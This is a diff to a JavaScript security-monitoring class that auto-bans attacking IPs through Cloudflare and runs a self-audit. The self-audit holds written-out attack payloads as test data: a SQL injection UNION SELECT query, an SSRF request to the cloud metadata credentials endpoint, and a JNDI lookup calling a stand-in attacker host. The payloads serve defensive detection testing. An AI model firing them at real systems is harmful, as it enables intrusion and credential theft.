     if (!skipDelay && threatEntry.quarantined && !inspection.isVerifiedSearchBot) {
       if (isNewThreat && shieldCfg.webhookUrl) {
         dispatchSignedWebhook({
@@ -809,9 +948,8 @@ export class SwarmCoordinator {
         }).catch(() => {});
       }
 
-      const qualifiesForCloudflareBan = inspection.independentSignals >= 2;
       if (
-        qualifiesForCloudflareBan &&
+        inspection.independentSignals >= 2 &&
         !threatEntry._cfBanDispatched &&
         shieldCfg.cloudflareApiToken &&
         shieldCfg.cloudflareZoneId &&
@@ -822,7 +960,7 @@ export class SwarmCoordinator {
           apiToken: shieldCfg.cloudflareApiToken,
           zoneId: shieldCfg.cloudflareZoneId,
           ip: threatEntry.ip,
-          note: `Auto-blocked by Guardianes Eternos (${threatEntry.signature})`
+          note: `Auto-blocked by Guardianes Eternos Deception (${threatEntry.signature})`
         }).catch(() => {});
       }
     }
@@ -837,13 +975,10 @@ export class SwarmCoordinator {
     };
   }
 
-  /**
-   * Auditoría Pentest en Vivo: dispara vectores reales (SQLi, SSRF Cloud, Java4Shell, ARTEX Playwright).
-   */
   async runAuditPentest(mode = 'full-audit') {
     const vectors = {
       sqli: {
-        name: 'SQL Injection (UNION SELECT)',
+        name: 'SQL Injection Probe (UNION SELECT)',
         ip: '198.51.100.77',
         path: '/productos',
         rawUrl: "/productos?id=1' UNION SELECT username,password FROM information_schema.tables--",
@@ -851,7 +986,7 @@ export class SwarmCoordinator {
         headers: {}
       },
       ssrf: {
-        name: 'SSRF Cloud Metadata Harvester',
+        name: 'SSRF Cloud Metadata Probe',
         ip: '203.0.113.45',
         path: '/api/proxy',
         rawUrl: '/api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
@@ -859,7 +994,7 @@ export class SwarmCoordinator {
         headers: {}
       },
       java4shell: {
-        name: 'CVE-2026-114938 Java4Shell & JNDI RCE Probe',
+        name: 'JNDI / Log4Shell Probe',
         ip: '192.0.2.118',
         path: '/api/auth',
         rawUrl: '/api/auth?token=${jndi:ldap://evil.attacker.invalid/Exploit}',
@@ -891,7 +1026,8 @@ export class SwarmCoordinator {
         );
         auditResults.push({
           vector: v.name,
-          intercepted: outcome.intercepted,
+          detected: Boolean(outcome.intercepted || outcome.alertRecorded),
+          intercepted: Boolean(outcome.intercepted),
           detectedVectors: outcome.inspection?.attackVectors || [],
           quarantined: Boolean(outcome.threatEntry?.quarantined)
         });
@@ -957,9 +1093,7 @@ export class SwarmCoordinator {
           path: targetPath,
           rawUrl: targetPath,
           userAgent: scenario.userAgent,
-          headers: {
-            'x-artex-agent': scenario.headerAgent
-          },
+          headers: { 'x-artex-agent': scenario.headerAgent },
           query
         },
         { skipDelay: true, internalActorKey }
